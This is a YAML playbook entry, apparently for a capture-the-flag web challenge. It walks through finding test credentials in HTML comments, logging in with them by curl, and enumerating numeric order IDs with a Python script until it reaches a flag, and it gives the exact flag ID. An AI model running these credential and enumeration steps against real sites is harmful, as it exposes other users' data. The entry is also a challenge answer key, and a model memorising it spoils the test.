name: idor_trading_platform
category: web
tags: [idor, default_credentials, broken_authorization, session, enumeration]
indicators:
  - "Login form with order/receipt system"
  - "Numeric ID in URL (e.g., /order/123)"
  - "Credentials hint in HTML comments"
  - "No authorization check when accessing other users' resources"

tricks:
  - name: "Step 1: Check HTML source for credentials"
    when: "First access, login required"
    how: "View page source, search for <!-- comments containing test credentials"
    payload: |
      curl -s http://TARGET/ | grep -i '<!--'
      # Found: <!-- TODO: Delete the testing account (test:test). -->

  # pragma: allowlist secret
  - name: "Step 2: Login with default credentials"
    when: "Found credentials in comments"
    how: "Submit username first, then password on redirect page"
    payload: |
      # Submit username
      curl -c cookies.txt -d 'username=test' http://TARGET/

      # Submit password (two-step login)
      curl -b cookies.txt -c cookies.txt -d 'password=test' http://TARGET/password/test

  - name: "Step 3: Explore authenticated features"
    when: "Login successful"
    how: "Navigate to find order/receipt functionality with numeric IDs"
    payload: |
      curl -b cookies.txt http://TARGET/dashboard
      # Found: /order/{id}/receipt endpoint

  - name: "Step 4: Enumerate order IDs for IDOR"
    when: "Found endpoint with numeric ID"
    how: "Iterate through ID range to find other users' orders"
    payload: |
      import requests

      s = requests.Session()
      # ... login first ...

      for id in range(300000, 301000):
          resp = s.get(f'http://TARGET/order/{id}/receipt')
          if 'FLAG{' in resp.text:
              print(f'Found flag at order {id}')
              print(resp.text)
              break

  - name: "Step 5: Extract the flag"
    when: "Found valid order ID"
    how: "Flag is in order ID 300401"
    payload: |
      curl -b cookies.txt http://TARGET/order/300401/receipt
      # FLAG{...}
